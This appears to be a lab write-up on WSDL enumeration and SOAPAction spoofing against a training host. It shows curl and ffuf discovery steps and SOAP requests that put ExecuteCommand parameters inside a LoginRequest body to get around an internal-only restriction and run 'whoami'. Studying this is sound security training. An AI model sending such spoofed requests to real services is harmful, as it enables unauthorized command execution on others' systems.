___

WSDL stands for Web Service Description Language. WSDL is an XML-based file exposed by web services that informs clients of the provided services/methods, including where they reside and the method-calling convention.

```bash
curl http://10.129.202.133:3002/wsdl
```

The response is empty. 

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -u  http://10.129.202.133:3002/wsdl -fs 0 
`````

```bash
curl http://10.129.202.133:3002/wsdl?wsdl
```

# SOAPAction Spoofing

```xml
<wsdl:operation name="ExecuteCommand">
<soap:operation soapAction="ExecuteCommand" style="document"/>
```

```xml
<s:element name="ExecuteCommandRequest">
<s:complexType>
<s:sequence>
<s:element minOccurs="1" maxOccurs="1" name="cmd" type="s:string"/>
</s:sequence>
</s:complexType>
</s:element>
```

```bash
curl -X POST http://10.129.202.133:3002/wsdl \
  -H "Content-Type: text/xml; charset=utf-8" \
  -H "SOAPAction: \"ExecuteCommand\"" \
  -d '<?xml version="1.0" encoding="utf-8"?>
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:tem="http://tempuri.org/">
   <soapenv:Header/>
   <soapenv:Body>
      <tem:ExecuteCommandRequest>
         <tem:cmd>your_command_here</tem:cmd>
      </tem:ExecuteCommandRequest>
   </soapenv:Body>
</soapenv:Envelope>'
```

error mentioning _This function is only allowed in internal networks_

- We specify _LoginRequest_ in `<soap:Body>`, so that our request goes through. This operation is allowed from the outside.
- We specify the parameters of _ExecuteCommand_ because we want to have the SOAP service execute a `whoami` command.
- We specify the blocked operation (_ExecuteCommand_) in the SOAPAction header

```bash
curl -X POST http://10.129.202.133:3002/wsdl \
  -H "Content-Type: text/xml; charset=utf-8" \
  -H "SOAPAction: \"ExecuteCommand\"" \
  -d '<?xml version="1.0" encoding="utf-8"?>
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:tem="http://tempuri.org/">
   <soapenv:Header/>
   <soapenv:Body>
      <tem:LoginRequest>
         <cmd>whoami</cmd>
      </tem:LoginRequest>
   </soapenv:Body>
</soapenv:Envelope>'
```

